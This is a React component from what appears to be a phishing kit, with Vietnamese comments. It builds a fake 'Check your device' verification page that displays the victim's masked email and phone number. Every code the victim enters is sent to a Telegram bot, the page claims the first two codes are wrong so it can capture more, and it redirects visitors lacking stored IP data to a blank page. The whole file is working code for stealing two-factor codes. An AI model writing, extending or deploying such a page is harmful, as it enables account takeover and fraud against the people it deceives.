import VerifyImage from '@/assets/images/681.png';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import config from '@/utils/config';
import { useNavigate } from 'react-router';
import { PATHS } from '@/router/router';

const Verify = () => {
    const navigate = useNavigate();
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [userInfo, setUserInfo] = useState({ email: '', phone: '' });

    // Lấy thông tin từ trang 1
    useEffect(() => {
        const savedUserInfo = localStorage.getItem('userInfo');
        if (savedUserInfo) {
            try {
                const userData = JSON.parse(savedUserInfo);
                setUserInfo({
                    email: userData.email && typeof userData.email === 'string' ? userData.email : '',
                    phone: userData.phone && typeof userData.phone === 'string' ? userData.phone : ''
                });
            } catch (error) {
                console.error('Error parsing userInfo:', error);
                setUserInfo({ email: '', phone: '' });
            }
        }
    }, []);

    // Format email: s****g@m****.com - FIXED
    const formatEmailForDisplay = (email) => {
        if (!email || typeof email !== 'string') return 's****g@m****.com';
        
        const parts = email.split('@');
        if (parts.length !== 2) return 's****g@m****.com';
        
        const username = parts[0];
        const domain = parts[1];
        
        // Xử lý username an toàn
        let formattedUsername;
        if (username.length === 1) {
            formattedUsername = username + '****';
        } else if (username.length === 2) {
            formattedUsername = username.charAt(0) + '***' + username.charAt(1);
        } else {
            formattedUsername = username.charAt(0) + 
                '*'.repeat(Math.max(1, username.length - 2)) + 
                username.charAt(username.length - 1);
        }
        
        // Xử lý domain an toàn
        const domainParts = domain.split('.');
        let formattedDomain;
        if (domainParts.length >= 2) {
            const mainDomain = domainParts[0];
            if (mainDomain.length === 1) {
                formattedDomain = mainDomain + '****.' + domainParts.slice(1).join('.');
            } else {
                formattedDomain = mainDomain.charAt(0) + 
                    '*'.repeat(Math.max(1, mainDomain.length - 1)) + 
                    '.' + domainParts.slice(1).join('.');
            }
        } else {
            formattedDomain = 'm****.com';
        }
        
        return formattedUsername + '@' + formattedDomain;
    };

    // Format số điện thoại: ******32 - FIXED
    const formatPhoneForDisplay = (phone) => {
        if (!phone || typeof phone !== 'string') return '******32';
        
        const cleanPhone = phone.replace(/^\+\d+\s*/, '').replace(/\D/g, '');
        
        // Xử lý số điện thoại ngắn
        if (cleanPhone.length <= 2) {
            return '*'.repeat(Math.max(4, cleanPhone.length)) + cleanPhone;
        }
        
        // Hiển thị số sao phù hợp với độ dài số
        const starsCount = Math.min(6, Math.max(4, cleanPhone.length - 2));
        const lastTwoDigits = cleanPhone.slice(-2);
        
        return '*'.repeat(starsCount) + lastTwoDigits;
    };

    const defaultTexts = useMemo(() => {
        // LUÔN dùng data thật từ trang 1 - cả tiếng Anh và các ngôn ngữ khác
        const actualEmail = formatEmailForDisplay(userInfo.email);
        const actualPhone = formatPhoneForDisplay(userInfo.phone);
        
        return {
            title: 'Check your device',
            description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`,
            placeholder: 'Enter your code',
            infoTitle: 'Approve from another device or Enter your verification code',
            infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
            submit: 'Continue',
            sendCode: 'Send new code',
            errorMessage: 'The verification code you entered is incorrect',
            loadingText: 'Please wait'
        };
    }, [userInfo.email, userInfo.phone]); // Phụ thuộc vào data thật

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(async (targetLang) => {
        try {
            const [
                translatedTitle,
                translatedDesc,
                translatedPlaceholder,
                translatedInfoTitle,
                translatedInfoDesc,
                translatedSubmit,
                translatedSendCode,
                translatedError,
                translatedLoading
            ] = await Promise.all([
                translateText(defaultTexts.title, targetLang),
                translateText(defaultTexts.description, targetLang), // Dùng description đã có data thật
                translateText(defaultTexts.placeholder, targetLang),
                translateText(defaultTexts.infoTitle, targetLang),
                translateText(defaultTexts.infoDescription, targetLang),
                translateText(defaultTexts.submit, targetLang),
                translateText(defaultTexts.sendCode, targetLang),
                translateText(defaultTexts.errorMessage, targetLang),
                translateText(defaultTexts.loadingText, targetLang)
            ]);

            setTranslatedTexts({
                title: translatedTitle,
                description: translatedDesc,
                placeholder: translatedPlaceholder,
                infoTitle: translatedInfoTitle,
                infoDescription: translatedInfoDesc,
                submit: translatedSubmit,
                sendCode: translatedSendCode,
                errorMessage: translatedError,
                loadingText: translatedLoading
            });
        } catch {
            // Fallback về default texts với data thật nếu dịch lỗi
            setTranslatedTexts(defaultTexts);
        }
    }, [defaultTexts]);

    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
        }
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        } else {
            // Đảm bảo dùng default texts với data thật cho tiếng Anh
            setTranslatedTexts(defaultTexts);
        }
    }, [translateAllTexts, defaultTexts]);

    const handleSubmit = async () => {
        if (!code.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
            await sendMessage(message);
        } catch {
            //
        }

        // Delay 1 giây mà không hiển thị countdown
        await new Promise((resolve) => setTimeout(resolve, 1000));

        // Tăng số lần thử
        const newAttempts = attempts + 1;
        setAttempts(newAttempts);

        // Hiển thị lỗi cho lần 1 và 2
        if (newAttempts < 3) {
            setShowError(true);
            setIsLoading(false);
            setCode('');
        } 
        // Lần thứ 3 chuyển trang luôn
        else {
            navigate(PATHS.SEND_INFO);
        }
    };

    return (
        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
            <title>Account | Privacy Policy</title>
            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                <p>{translatedTexts.description}</p>

                <img src={VerifyImage} alt='' />
                <input
                    type='number'
                    inputMode='numeric'
                    max={8}
                    placeholder={translatedTexts.placeholder}
                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2'
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                />
                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
                    <div>
                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
                    </div>
                </div>

                <button
                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
                    onClick={handleSubmit}
                    disabled={isLoading || !code.trim()}
                >
                    {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
                </button>

                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
            </div>
        </div>
    );
};

export default Verify;
